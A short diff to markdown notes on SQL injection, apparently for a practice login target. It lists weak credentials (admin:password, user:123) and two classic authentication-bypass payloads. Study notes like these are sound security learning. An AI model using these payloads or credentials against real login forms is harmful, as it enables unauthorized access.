@@ -3,13 +3,14 @@
 ## Login
 [Reference][1]
 
-Username: *admin* or *user*
+  * admin:password
+  * user:123
 
 ```sql
 anything' OR 'x'='x'
 anything' OR 1='1
 ```
 
-TODO
+## Read
 
 [1]: http://www.unixwiz.net/techtips/sql-injection.html
